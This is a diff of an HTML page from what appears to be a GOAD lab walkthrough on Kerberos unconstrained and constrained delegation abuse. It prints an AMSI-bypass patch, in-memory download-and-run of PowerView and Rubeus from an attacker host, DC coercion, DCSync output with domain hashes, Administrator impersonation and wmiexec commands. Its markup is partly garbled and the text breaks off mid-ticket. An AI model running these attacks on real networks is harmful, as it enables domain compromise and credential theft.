@@ -3,17 +3,52 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Part 9 - Delegations - Done - GOAD</title>
+  <title>Part 9 - GOAD</title>
   <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
   <link rel="stylesheet" href="../assets/css/style.css">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
   <style>
-    .article-image { max-width: 100%; height: auto; margin: 20px 0; border-radius: 8px; }
-    pre { background: #1e1e1e; padding: 15px; border-radius: 8px; overflow-x: auto; }
-    code { font-family: 'Courier New', monospace; background: #2a2a2a; padding: 2px 6px; border-radius: 4px; }
-    pre code { background: none; padding: 0; }
+    /* GOAD Content Styles */
+    .article-content { line-height: 1.8; }
+    .article-content h1 { font-size: 2rem; margin: 30px 0 20px; color: var(--white-2); border-bottom: 2px solid #ffdb70; padding-bottom: 10px; }
+    .article-content h2 { font-size: 1.5rem; margin: 25px 0 15px; color: var(--white-2); }
+    .article-content h3 { font-size: 1.25rem; margin: 20px 0 10px; color: var(--white-2); }
+    .article-content h4 { font-size: 1.1rem; margin: 15px 0 10px; color: var(--white-2); }
+    .article-content p { margin: 15px 0; color: var(--light-gray); }
+    .article-content strong { color: var(--white-2); font-weight: 600; }
+    .article-content ul { margin: 15px 0 15px 30px; }
+    .article-content li { margin: 5px 0; color: var(--light-gray); }
+    .article-image { max-width: 100%; height: auto; margin: 20px 0; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.3); }
+    
+    /* Code blocks with yellow border */
+    .article-content pre { 
+      background: #1e1e1e; 
+      border-left: 4px solid #ffdb70;
+      padding: 15px; 
+      margin: 20px 0;
+      border-radius: 0 8px 8px 0; 
+      overflow-x: auto;
+      font-family: 'Courier New', monospace;
+      font-size: 0.9rem;
+    }
+    .article-content code { 
+      font-family: 'Courier New', monospace; 
+      background: #2d2d2d; 
+      padding: 2px 6px; 
+      border-radius: 4px;
+      color: #ffdb70;
+      font-size: 0.9em;
+    }
+    .article-content pre code { 
+      background: none; 
+      padding: 0;
+      color: #f8f8f2;
+    }
+    
+    .article-content a { color: #ffdb70; text-decoration: none; }
+    .article-content a:hover { text-decoration: underline; }
   </style>
 </head>
 <body>
@@ -28,10 +63,11 @@
           <p class="title">GOAD Walkthrough</p>
         </div>
         <button class="info_more-btn" data-sidebar-btn>
-          <span>Show More</span>
+          <span>Show Contacts</span>
           <ion-icon name="chevron-down"></ion-icon>
         </button>
       </div>
+      
       <div class="sidebar-info_more">
         <div class="separator"></div>
         <ul class="contacts-list">
@@ -40,8 +76,8 @@
               <ion-icon name="arrow-back-outline"></ion-icon>
             </div>
             <div class="contact-info">
-              <p class="contact-title">Back to Overview</p>
-              <a href="./" class="contact-link">Study Notes</a>
+              <p class="contact-title">Back</p>
+              <a href="../" class="contact-link">Portfolio</a>
             </div>
           </li>
         </ul>
@@ -60,27 +96,25 @@
       <nav class="navbar">
         <ul class="navbar-list">
           <li class="navbar-item"><a href="./" class="navbar-link ">Overview</a></li>
-          <li class="navbar-item"><a href="part-01.html" class="navbar-link ">P1 - reconnaissan...</a></li>
-          <li class="navbar-item"><a href="part-02.html" class="navbar-link ">P2 - Finding Users</a></li>
-          <li class="navbar-item"><a href="part-03.html" class="navbar-link ">P3 - Authenticate...</a></li>
-          <li class="navbar-item"><a href="part-04.html" class="navbar-link ">P4 - Network Pois...</a></li>
-          <li class="navbar-item"><a href="part-05.html" class="navbar-link ">P5 - ADCS - ESC1 ...</a></li>
-          <li class="navbar-item"><a href="part-06.html" class="navbar-link ">P6 - MSSQL - Done</a></li>
-          <li class="navbar-item"><a href="part-07.html" class="navbar-link ">P7 - Privilege es...</a></li>
-          <li class="navbar-item"><a href="part-08.html" class="navbar-link ">P8 - Lateral move...</a></li>
-          <li class="navbar-item"><a href="part-09.html" class="navbar-link active">P9 - Delegations ...</a></li>
-          <li class="navbar-item"><a href="part-10.html" class="navbar-link ">P10 - ACL - Done</a></li>
-          <li class="navbar-item"><a href="part-11.html" class="navbar-link ">P11 - Abusing Tru...</a></li>
-          <li class="navbar-item"><a href="part-12.html" class="navbar-link ">P12 - Having fun ...</a></li>
+          <li class="navbar-item"><a href="part-01.html" class="navbar-link ">Part 1</a></li>
+          <li class="navbar-item"><a href="part-02.html" class="navbar-link ">Part 2</a></li>
+          <li class="navbar-item"><a href="part-03.html" class="navbar-link ">Part 3</a></li>
+          <li class="navbar-item"><a href="part-04.html" class="navbar-link ">Part 4</a></li>
+          <li class="navbar-item"><a href="part-05.html" class="navbar-link ">Part 5</a></li>
+          <li class="navbar-item"><a href="part-06.html" class="navbar-link ">Part 6</a></li>
+          <li class="navbar-item"><a href="part-07.html" class="navbar-link ">Part 7</a></li>
+          <li class="navbar-item"><a href="part-08.html" class="navbar-link ">Part 8</a></li>
+          <li class="navbar-item"><a href="part-09.html" class="navbar-link active">Part 9</a></li>
+          <li class="navbar-item"><a href="part-10.html" class="navbar-link ">Part 10</a></li>
+          <li class="navbar-item"><a href="part-11.html" class="navbar-link ">Part 11</a></li>
+          <li class="navbar-item"><a href="part-12.html" class="navbar-link ">Part 12</a></li>
         </ul>
       </nav>
 
       <article class="about active" data-page="about">
-        <header class="h2 article-title">Part 9 - Delegations - Done</header>
-        <section class="about-text">
-          <ul>
-<li><strong>GOAD - part 9 - Delegations - Done</strong></li>
-</ul>
+        <header class="h2 article-title">Part 9</header>
+        <section class="about-text article-content">
+          <h2>GOAD - part 9 - Delegations - Done</h2>
     
     
     Within an Active Directory, services can be used by users. 
@@ -157,8 +191,7 @@
     
     <strong>asmi.txt</strong>
     
-    ``<code>bash
-    # Patching amsi.dll AmsiScanBuffer by rasta-mouse
+    <pre><code class="language-bash">    # Patching amsi.dll AmsiScanBuffer by rasta-mouse
     $Win32 = @"
     
     using System;
@@ -187,12 +220,11 @@
     $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
     [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
     
-    </code>`<code>
+    </code></pre>
     
     We can use the following script in Powershell to enumerate Unconstrained Delegation.
     
-    </code>`<code>powershell
-    # Import the Active Directory module
+    <pre><code class="language-powershell">    # Import the Active Directory module
     Import-Module ActiveDirectory
     
     # Get a list of all user accounts in the domain
@@ -213,7 +245,7 @@
             }
         }
     }
-    </code>`<code>
+    </code></pre>
     
      
     
@@ -223,43 +255,43 @@
     
     Then we can upload PowerView.ps1 using this
     
-    </code>iex (iwr -UseBasicParsing <a href="http://192.168.56.1:8080/PowerView.ps1" target="_blank">http://10.4.10.1:8080/PowerView.ps1</a>)<code>
+    <code>iex (iwr -UseBasicParsing &lt;a href="http://192.168.56.1:8080/PowerView.ps1" target="_blank"&gt;http://10.4.10.1:8080/PowerView.ps1&lt;/a&gt;)</code>
     
     After uploading PowerView.ps1 we just need to the machine we just need to import it. 
     
     Importing PowerShell scripts are really simple. 
     
-    </code>. .\PowerView.ps1<code>
+    <code>. .\PowerView.ps1</code>
     
     Now we can execute all PowerView commands straightforward:
     
-    </code>Get-DomainComputer -Unconstrained -Properties serviceprincipalname,name,samaccountname,samaccounttype,useraccountcontrol,dnshostname | fl<code>
+    <code>Get-DomainComputer -Unconstrained -Properties serviceprincipalname,name,samaccountname,samaccounttype,useraccountcontrol,dnshostname | fl</code>
     
     <img src="images/image-244.png" alt="Untitled" class="article-image" loading="lazy">
     
-    </code>Get-DomainUser -TrustedToAuth | Select-Object samaccountname,msds-allowedtodelegateto,useraccountcontrol | Format-Table -Wrap<code>
+    <code>Get-DomainUser -TrustedToAuth | Select-Object samaccountname,msds-allowedtodelegateto,useraccountcontrol | Format-Table -Wrap</code>
     
     <img src="images/image-245.png" alt="Untitled" class="article-image" loading="lazy">
     
     We have gathered enough information to know that we do have Unconstrained Delegation configured in this Machine for user <strong>Jon.Snow</strong> and its <strong>Delegation Rights</strong>.
     
-    Unconstrained Delegation is enabled for user <strong></code>jon.snow<code></strong>
+    Unconstrained Delegation is enabled for user <strong><code>jon.snow</code></strong>
     Delegation Rights for <strong>jon.snow</strong>:
-    **</code>CIFS/winterfell
-    CIFS/winterfell.north.sevenkingdoms.local<code>**
+    <strong><code>CIFS/winterfell
+    CIFS/winterfell.north.sevenkingdoms.local</code></strong>
     
-    </code>$data = (New-Object System.Net.WebClient).DownloadData('http://10.4.10.1:8080/Rubeus.exe')
+    <code>$data = (New-Object System.Net.WebClient).DownloadData('http://10.4.10.1:8080/Rubeus.exe')
     $assem = [System.Reflection.Assembly]::Load($data);
-    [Rubeus.Program]::MainString("triage");<code>
+    [Rubeus.Program]::MainString("triage");</code>
     
     <img src="images/image-246.png" alt="Untitled" class="article-image" loading="lazy">
     
     Now Lets use <a href="https://github.com/p0dalirius/Coercer" target="_blank">Coercer</a> force a coerce of the DC <strong>kingslanding</strong> to the DC <strong>winterfell</strong>.
     
-    </code>sudo coercer coerce -u arya.stark -d north.sevenkingdoms.local -p Needle -t kingslanding.sevenkingdoms.local -l winterfell<code>
+    <code>sudo coercer coerce -u arya.stark -d north.sevenkingdoms.local -p Needle -t kingslanding.sevenkingdoms.local -l winterfell</code>
     
     Since it will make us passing C several times I decided to automatize it using the following:
-    </code>yes C | sudo coercer coerce -u arya.stark -d north.sevenkingdoms.local -p Needle -t kingslanding.sevenkingdoms.local -l winterfell<code>
+    <code>yes C | sudo coercer coerce -u arya.stark -d north.sevenkingdoms.local -p Needle -t kingslanding.sevenkingdoms.local -l winterfell</code>
     
     Now after running Coercer we can check with Rubeus again in memory.
     
@@ -272,34 +304,28 @@
 <ul>
 <li>We now have the TGT of the domain controller</li>
 <li>Let’s continue on linux to pass the ticket and launch dcsync with secretdump :</li>
-<ul>
-<li>copy the ticket without space and return line (in vim i do : </code>:%s/\s<em>\n\s</em>//g<code>)</li>
+<li>copy the ticket without space and return line (in vim i do : <code>:%s/\s&lt;em&gt;\n\s&lt;/em&gt;//g</code>)</li>
 <li>convert the ticket to ccache</li>
 <li>use the kerberos ticket and launch secretdump</li>
-</ul>
-</ul>
-</ul>
-</ul>
-</ul>
     
-    </code>cat KINGSLANDING$.b64|base64 -d > KINGSLANDING$.kirbi<code>
+    <code>cat KINGSLANDING$.b64|base64 -d &gt; KINGSLANDING$.kirbi</code>
     
-    </code>ticketConverter.py KINGSLANDING$.kirbi KINGSLANDING$.ccache<code>
+    <code>ticketConverter.py KINGSLANDING$.kirbi KINGSLANDING$.ccache</code>
     
     <img src="images/image-249.png" alt="Untitled" class="article-image" loading="lazy">
     
-    </code>export KRB5CCNAME=KINGSLANDING$.ccache<code>
+    <code>export KRB5CCNAME=KINGSLANDING$.ccache</code>
     
-    <a href="http://secretsdump.py/" target="_blank"></code>secretsdump.py</a> -k -no-pass sevenkingdoms.local/'kingslanding$'@kingslanding<code>
+    <a href="http://secretsdump.py/" target="_blank"><code>secretsdump.py&lt;/a&gt; -k -no-pass sevenkingdoms.local/'kingslanding$'@kingslanding</code>
     
     <img src="images/image-250.png" alt="Untitled" class="article-image" loading="lazy">
     
-    </code>`<code>bash
-    Impacket v0.12.0.dev1+20231130.165011.d370e63 - Copyright 2023 Fortra
+    <pre><code class="language-bash">    Impacket v0.12.0.dev1+20231130.165011.d370e63 - Copyright 2023 Fortra
     
+</ul>
     [-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
-    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
-    [*] Using the DRSUAPI method to get NTDS.DIT secrets
+    [&lt;em&gt;] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+    [&lt;/em&gt;] Using the DRSUAPI method to get NTDS.DIT secrets
     Administrator:500:aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a581a1705e:::
     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
     krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b2172b9519c38d11551fa488aa1ef3a3:::
@@ -318,7 +344,7 @@
     KINGSLANDING$:1001:aad3b435b51404eeaad3b435b51404ee:e6afff3a8889163ff5e3d83e267710c8:::
     NORTH$:1104:aad3b435b51404eeaad3b435b51404ee:b33545882c07af32620ab8aa94ced73f:::
     ESSOS$:1105:aad3b435b51404eeaad3b435b51404ee:de68488617d0c5fae23d50908947c297:::
-    [*] Kerberos keys grabbed
+    [&lt;em&gt;] Kerberos keys grabbed
     Administrator:aes256-cts-hmac-sha1-96:bdb1a615bc9d82d2ab21f09f11baaef4bc66c48efdd56424e1206e581e4dd827
     Administrator:aes128-cts-hmac-sha1-96:0c72a36a70f696fbee13a25fd3412d43
     Administrator:des-cbc-md5:7f2cd0836164e592
@@ -370,15 +396,15 @@
     ESSOS$:aes256-cts-hmac-sha1-96:158707644064c9fb9d67a3d4017c53051f30eb5b4d7d85df9c19d638f5c13fbc
     ESSOS$:aes128-cts-hmac-sha1-96:24a145f3ef5fb370b76516d5ab98961e
     ESSOS$:des-cbc-md5:51bfb6e53b526d83
-    [*] Cleaning up...
-    </code>`<code>
+    [&lt;/em&gt;] Cleaning up...
+    </code></pre>
     
     By doing this DSync we were able to privesc from one domain to another, we moved from NORTH.SEVENKINGDOMS.LOCAL to SEVENKINGDOMS.LOCAL
     
     # <strong>Constrained Delegation</strong>
     
     If a computer or a service account has the <strong>Constrained Delegation</strong> flag set, a list of authorized services shall be associated to this flag. For example, in previous example (web server and file server), the
-     web server will have the <strong>Constrained Delegation</strong> flag indicating that this account can only impersonate some users against </code>CIFS<code> service hosted by </code>SERVER01<code>, the file server.
+     web server will have the <strong>Constrained Delegation</strong> flag indicating that this account can only impersonate some users against <code>CIFS</code> service hosted by <code>SERVER01</code>, the file server.
     
     <img src="images/image-251.png" alt="constrained_delegation_schema.png" class="article-image" loading="lazy">
     
@@ -386,13 +412,13 @@
     
     In other words, the Domain Controller will read the SPN list on this account, and will decide: “This account is allowed to impersonate a user, so he can authenticate against one of these services on behalf of the user”.
     
-    In this example, the web server is </code>WEB-SERVER-01<code> and the one with file sharing is </code>WEB-SERVER-02<code>. So here is what the list of services for which </code>WEB-SERVER-01<code> can pretend  to be the user looks like :
+    In this example, the web server is <code>WEB-SERVER-01</code> and the one with file sharing is <code>WEB-SERVER-02</code>. So here is what the list of services for which <code>WEB-SERVER-01</code> can pretend  to be the user looks like :
     
     <img src="images/image-252.png" alt="delegation_cifs.png" class="article-image" loading="lazy">
     
-    <strong>Service for User to self (<em>S4U2self</em>):</strong> If a <strong>service account</strong> has a <em>userAccountControl</em> value containing </code>TRUSTED_TO_AUTH_FOR_DELEGATION<code> (T2A4D), then it can obtain a TGS for itself (the service) on behalf of any other user.
+    *<em>Service for User to self (</em>S4U2self<em>):<strong> If a </strong>service account</em>* has a <em>userAccountControl</em> value containing <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code> (T2A4D), then it can obtain a TGS for itself (the service) on behalf of any other user.
     
-    <strong>Service for User to Proxy(<em>S4U2proxy</em>):</strong> A <strong>service account</strong> could obtain a TGS on behalf any user to the service set in <strong>msDS-AllowedToDelegateTo.</strong> To do so, it first need a TGS from that user to itself, but it can use S4U2self to obtain that TGS before requesting the other one.
+    *<em>Service for User to Proxy(</em>S4U2proxy<em>):<strong> A </strong>service account<strong> could obtain a TGS on behalf any user to the service set in </strong>msDS-AllowedToDelegateTo.<strong> To do so, it first need a TGS from that user to itself, but it can use S4U2self to obtain that TGS before requesting the other one.
     
     <img src="images/image-253.png" alt="Untitled" class="article-image" loading="lazy">
     
@@ -400,15 +426,15 @@
     
     <img src="images/image-254.png" alt="Untitled" class="article-image" loading="lazy">
     
-    # Constrained Delegation W<strong>ith Protocol Transition</strong>
+    # Constrained Delegation W</strong>ith Protocol Transition<strong>
     
-    If a service is configured with constrained delegation <strong>with protocol transition</strong>, then it can obtain a service ticket on behalf of a user by combining S4U2self and S4U2proxy requests, as long as the user is not sensitive for delegation, or a member of the "Protected Users" group. The service ticket can then be used with Pass-The-Ticket This process is similar to Resource-Based-Constrained-Delegation exploitation
+    If a service is configured with constrained delegation </strong>with protocol transition<strong>, then it can obtain a service ticket on behalf of a user by combining S4U2self and S4U2proxy requests, as long as the user is not sensitive for delegation, or a member of the "Protected Users" group. The service ticket can then be used with Pass-The-Ticket This process is similar to Resource-Based-Constrained-Delegation exploitation
     
     <img src="images/image-255.png" alt="delegation_windows_constrained_user_any.png" class="article-image" loading="lazy">
     
-    # Abusing Constrained Delegation W<strong>ithout Protocol Transition</strong>
+    # Abusing Constrained Delegation W</strong>ithout Protocol Transition<strong>
     
-    If a service is configured with Constrained Delegation <strong>without protocol transition</strong> (i.e. set with "Kerberos only"), then S4U2self requests won't result in forwardable service tickets, hence failing at providing the requirement for S4U2proxy to work.
+    If a service is configured with Constrained Delegation </strong>without protocol transition<strong> (i.e. set with "Kerberos only"), then S4U2self requests won't result in forwardable service tickets, hence failing at providing the requirement for S4U2proxy to work.
     
     There are two known ways attackers can use to bypass this and obtain a forwardable ticket, on behalf of a user, to the requesting service (i.e. what S4U2Self would be used for):
     
@@ -425,31 +451,31 @@
     
     ## Enumerating Constrained Delegation with Protocol Transition
     
-    1. <strong>Enumerate Computers with Constrained Delegation</strong>:
+    1. </strong>Enumerate Computers with Constrained Delegation<strong>:
         
-        </code>Get-DomainComputer -TrustedToAuth -Properties 'samaccountname,useraccountcontrol,msds-allowedtodelegateto'<code>
-        This command will return a list of computers that have the "TRUSTED_TO_AUTH_FOR_DELEGATION" flag set in their </code>useraccountcontrol<code> property. The </code>msds-allowedtodelegateto<code> property will show the services that these computers are allowed to delegate to.
+        <code>Get-DomainComputer -TrustedToAuth -Properties 'samaccountname,useraccountcontrol,msds-allowedtodelegateto'</code>
+        This command will return a list of computers that have the "TRUSTED_TO_AUTH_FOR_DELEGATION" flag set in their <code>useraccountcontrol</code> property. The <code>msds-allowedtodelegateto</code> property will show the services that these computers are allowed to delegate to.
         
-    2. <strong>Enumerate Users with Constrained Delegation</strong>:
+    2. </strong>Enumerate Users with Constrained Delegation<strong>:
         
-        </code>Get-DomainUser -TrustedToAuth -Properties 'samaccountname,useraccountcontrol,msds-allowedtodelegateto'<code>
-        This command will return a list of user accounts that have the "TRUSTED_TO_AUTH_FOR_DELEGATION" flag set in their </code>useraccountcontrol<code> property. The </code>msds-allowedtodelegateto<code> property will show the services that these users are allowed to delegate to.
+        <code>Get-DomainUser -TrustedToAuth -Properties 'samaccountname,useraccountcontrol,msds-allowedtodelegateto'</code>
+        This command will return a list of user accounts that have the "TRUSTED_TO_AUTH_FOR_DELEGATION" flag set in their <code>useraccountcontrol</code> property. The <code>msds-allowedtodelegateto</code> property will show the services that these users are allowed to delegate to.
         
     
     The key differences between the two approaches are:
     
-    1. <strong>Without Protocol Transition</strong>: The </code>Get-DomainComputer -TrustedToAuth<code> and </code>Get-DomainUser -TrustedToAuth<code> commands will return objects that are configured for Constrained Delegation, but they do not have the "TRUSTED_FOR_DELEGATION" flag set, which means they can only delegate to the specific services listed in the </code>msds-allowedtodelegateto<code> property.
-    2. <strong>With Protocol Transition</strong>: The </code>Get-DomainComputer -TrustedToAuthForDelegation<code> command will return objects that have both the "TRUSTED_TO_AUTH_FOR_DELEGATION" and "TRUSTED_FOR_DELEGATION" flags set. This means they can not only delegate to the specific services listed in the </code>msds-allowedtodelegateto<code> property, but they can also perform protocol transition, which allows them to delegate to any service that the user has access to.
+    1. </strong>Without Protocol Transition<strong>: The <code>Get-DomainComputer -TrustedToAuth</code> and <code>Get-DomainUser -TrustedToAuth</code> commands will return objects that are configured for Constrained Delegation, but they do not have the "TRUSTED_FOR_DELEGATION" flag set, which means they can only delegate to the specific services listed in the <code>msds-allowedtodelegateto</code> property.
+    2. </strong>With Protocol Transition<strong>: The <code>Get-DomainComputer -TrustedToAuthForDelegation</code> command will return objects that have both the "TRUSTED_TO_AUTH_FOR_DELEGATION" and "TRUSTED_FOR_DELEGATION" flags set. This means they can not only delegate to the specific services listed in the <code>msds-allowedtodelegateto</code> property, but they can also perform protocol transition, which allows them to delegate to any service that the user has access to.
     
-    In both cases, the </code>msds-allowedtodelegateto<code> property is the key piece of information that you need to identify the services that the compromised account can delegate to.
+    In both cases, the <code>msds-allowedtodelegateto</code> property is the key piece of information that you need to identify the services that the compromised account can delegate to.
     
     # Abusing Constrained Delegation With Protocol Transition
     
-    <strong>Note</strong>: If a user is marked as ‘<em>Account is sensitive and cannot be delegated</em> ’ in AD, you will <strong>not be able to impersonate</strong> them.
+    </strong>Note</em><em>: If a user is marked as ‘</em>Account is sensitive and cannot be delegated* ’ in AD, you will <strong>not be able to impersonate</strong> them.
     
     This means that if you <strong>compromise the hash of the service</strong> you can <strong>impersonate users</strong> and obtain <strong>access</strong> on their behalf to the <strong>service configured</strong> (possible <strong>privesc</strong>).
     
-    Moreover, you <strong>won't only have access to the service that the user is able to impersonate, but also to any service</strong> because the SPN (the service name requested) is not being checked, only privileges. Therefore, if you have access to <strong>CIFS service</strong> you can also have access to <strong>HOST service</strong> using </code>/altservice<code> flag in Rubeus.
+    Moreover, you <strong>won't only have access to the service that the user is able to impersonate, but also to any service</strong> because the SPN (the service name requested) is not being checked, only privileges. Therefore, if you have access to <strong>CIFS service</strong> you can also have access to <strong>HOST service</strong> using <code>/altservice</code> flag in Rubeus.
     
     # ENUMERATION
     
@@ -457,42 +483,39 @@
     
     ## Impacket
     
-    <a href="http://finddelegation.py/" target="_blank"></code>findDelegation.py</a> NORTH.SEVENKINGDOMS.LOCAL/arya.stark:Needle -target-domain north.sevenkingdoms.local<code>
+    <a href="http://finddelegation.py/" target="_blank"><code>findDelegation.py&lt;/a&gt; NORTH.SEVENKINGDOMS.LOCAL/arya.stark:Needle -target-domain north.sevenkingdoms.local</code>
     
     <img src="images/image-258.png" alt="Untitled" class="article-image" loading="lazy">
     
 <ul>
 <li><strong>jon.snow</strong> is listed as having "Constrained w/ Protocol Transition" for both delegation entries, meaning this account is configured with constrained delegation <strong>with protocol transition</strong>.</li>
 <li><strong>CASTELBLACK$</strong> is listed as simply "Constrained," meaning this account is configured with constrained delegation <strong>without protocol transition</strong>.</li>
-</ul>
-</ul>
-</ul>
     
+</ul>
     So, <strong>jon.snow</strong> has constrained delegation with protocol transition, and <strong>CASTELBLACK$</strong> has constrained delegation without protocol transition.
     
     Using <strong><em>findDelegation</em></strong> from Impacket, we were able to see that Constrained Delegation has been configured for user <strong>Jon.Snow</strong> with Protocol Transition and for computer <strong>CASTELBLACK$</strong> Without Protocol Transition. The output also show the Delegation Rights for each account.
     
     ## PowerView
     
-    We can upload PowerView.ps1 using this: </code>iex (iwr -UseBasicParsing <a href="http://192.168.56.1:8080/PowerView.ps1" target="_blank">http://10.4.10.1:8080/PowerView.ps1</a>)<code>
+    We can upload PowerView.ps1 using this: <code>iex (iwr -UseBasicParsing &lt;a href="http://192.168.56.1:8080/PowerView.ps1" target="_blank"&gt;http://10.4.10.1:8080/PowerView.ps1&lt;/a&gt;)</code>
     
     To enumerate Constrained Delegation with Protocol Transition, you can use the following PowerView command:
     
-    </code>`<code>powershell
-    Get-DomainComputer -TrustedToAuthForDelegation -Properties 'samaccountname,useraccountcontrol,msds-allowedtodelegateto'
-    </code>`<code>
+    <pre><code class="language-powershell">    Get-DomainComputer -TrustedToAuthForDelegation -Properties 'samaccountname,useraccountcontrol,msds-allowedtodelegateto'
+    </code></pre>
     
-    This command will return a list of computers that have the "TRUSTED_TO_AUTH_FOR_DELEGATION" and "TRUSTED_FOR_DELEGATION" flags set in their </code>useraccountcontrol<code> property. The </code>msds-allowedtodelegateto<code> property will show the services that these computers are allowed to delegate to.
+    This command will return a list of computers that have the "TRUSTED_TO_AUTH_FOR_DELEGATION" and "TRUSTED_FOR_DELEGATION" flags set in their <code>useraccountcontrol</code> property. The <code>msds-allowedtodelegateto</code> property will show the services that these computers are allowed to delegate to.
     
     The key differences between the two approaches are:
     
-    1. <strong>Without Protocol Transition</strong>: The </code>Get-DomainComputer -TrustedToAuth<code> and </code>Get-DomainUser -TrustedToAuth<code> commands will return objects that are configured for Constrained Delegation, but they do not have the "TRUSTED_FOR_DELEGATION" flag set, which means they can only delegate to the specific services listed in the </code>msds-allowedtodelegateto<code> property.
-    2. <strong>With Protocol Transition</strong>: The </code>Get-DomainComputer -TrustedToAuthForDelegation<code> command will return objects that have both the "TRUSTED_TO_AUTH_FOR_DELEGATION" and "TRUSTED_FOR_DELEGATION" flags set. This means they can not only delegate to the specific services listed in the </code>msds-allowedtodelegateto<code> property, but they can also perform protocol transition, which allows them to delegate to any service that the user has access to.
+    1. <strong>Without Protocol Transition</strong>: The <code>Get-DomainComputer -TrustedToAuth</code> and <code>Get-DomainUser -TrustedToAuth</code> commands will return objects that are configured for Constrained Delegation, but they do not have the "TRUSTED_FOR_DELEGATION" flag set, which means they can only delegate to the specific services listed in the <code>msds-allowedtodelegateto</code> property.
+    2. <strong>With Protocol Transition</strong>: The <code>Get-DomainComputer -TrustedToAuthForDelegation</code> command will return objects that have both the "TRUSTED_TO_AUTH_FOR_DELEGATION" and "TRUSTED_FOR_DELEGATION" flags set. This means they can not only delegate to the specific services listed in the <code>msds-allowedtodelegateto</code> property, but they can also perform protocol transition, which allows them to delegate to any service that the user has access to.
     
-    In both cases, the </code>msds-allowedtodelegateto<code> property is the key piece of information that you need to identify the services that the compromised account can delegate to.
+    In both cases, the <code>msds-allowedtodelegateto</code> property is the key piece of information that you need to identify the services that the compromised account can delegate to.
     
-    </code>Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
-    Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto<code>
+    <code>Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
+    Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto</code>
     
     <img src="images/image-259.png" alt="Untitled" class="article-image" loading="lazy">
     
@@ -504,14 +527,14 @@
     
     Now that we confirmed that we do have the Constrained Delegation with Protocol Transition for machine account jon.snow for CIFS on WINTERFELL server, we can try to impersonate the Administrator.
     
-    </code>getST -spn "cifs/target" -impersonate "administrator" "domain/service:password"<code>
+    <code>getST -spn "cifs/target" -impersonate "administrator" "domain/service:password"</code>
     
-    </code>getST.py -spn 'CIFS/winterfell' -impersonate Administrator -dc-ip '10.4.10.11' 'north.sevenkingdoms.local/jon.snow:iknownothing'<code>
+    <code>getST.py -spn 'CIFS/winterfell' -impersonate Administrator -dc-ip '10.4.10.11' 'north.sevenkingdoms.local/jon.snow:iknownothing'</code>
     
     <img src="images/image-260.png" alt="Untitled" class="article-image" loading="lazy">
     
-    > *[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
-    [-] Probably SPN is not allowed to delegate by user user1 or initial TGT not forwardable*
+    > <em>[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
+    [-] Probably SPN is not allowed to delegate by user user1 or initial TGT not forwardable</em>
     > 
     
     When attempting to exploit that technique, if the error above triggers, it means that either the account was sensitive for delegation, or a member of the "<strong>Protected Users</strong>" group OR the constrained delegations are configured Without Protocol Transition.
@@ -520,36 +543,35 @@
     
     ### wmiexec Shell
     
-    </code>export KRB5CCNAME=Administrator.ccache
-    <a href="http://wmiexec.py/" target="_blank">wmiexec.py</a> -k -no-pass north.sevenkingdoms.local/administrator@winterfell<code>
+    <code>export KRB5CCNAME=Administrator.ccache
+    &lt;a href="http://wmiexec.py/" target="_blank"&gt;wmiexec.py&lt;/a&gt; -k -no-pass north.sevenkingdoms.local/administrator@winterfell</code>
     
     <img src="images/image-261.png" alt="Untitled" class="article-image" loading="lazy">
     
     ### DSync Attack
     
-    </code>export KRB5CCNAME=Administrator.ccache<code>
+    <code>export KRB5CCNAME=Administrator.ccache</code>
     
-    <a href="http://secretsdump.py/" target="_blank"></code>secretsdump.py</a> -k -no-pass 'north.sevenkingdoms.local/administrator@winterfell'<code>
+    <a href="http://secretsdump.py/" target="_blank"><code>secretsdump.py&lt;/a&gt; -k -no-pass 'north.sevenkingdoms.local/administrator@winterfell'</code>
     
     <img src="images/image-262.png" alt="Untitled" class="article-image" loading="lazy">
     
     # Exploiting With Rubeus
     
-    <strong></code>Note:<code></strong> CMD MUST be started as Administrator in order to complete this attack with success from Windows.
+    <strong><code>Note:</code></strong> CMD MUST be started as Administrator in order to complete this attack with success from Windows.
     
     From our previous recon, we already know that user jon.snow is configure with <strong>Constrained Delegation With Protocol Transition</strong>, so lets use take advantage of this user.
     
     Running Rubeus.exe from memory after AV bypass.
     
-    </code>$data = (New-Object System.Net.WebClient).DownloadData('http://10.4.10.1:8080/Rubeus.exe')
-    $assem = [System.Reflection.Assembly]::Load($data);<code>
+    <code>$data = (New-Object System.Net.WebClient).DownloadData('http://10.4.10.1:8080/Rubeus.exe')
+    $assem = [System.Reflection.Assembly]::Load($data);</code>
     
-    </code>[Rubeus.Program]::MainString("asktgt /user:jon.snow /domain:north.sevenkingdoms.local /rc4:B8D76E56E9DAC90539AFF05E3CCB1755");<code>
+    <code>[Rubeus.Program]::MainString("asktgt /user:jon.snow /domain:north.sevenkingdoms.local /rc4:B8D76E56E9DAC90539AFF05E3CCB1755");</code>
     
     <img src="images/image-263.png" alt="Untitled" class="article-image" loading="lazy">
     
-    </code>`<code>powershell
-    doIFiDCCBYSgAwIBBaEDAgEWooIEdjCCBHJhggRuMIIEaqADAgEFoRsbGU5PUlRILlNFVkVOS0lOR0RP
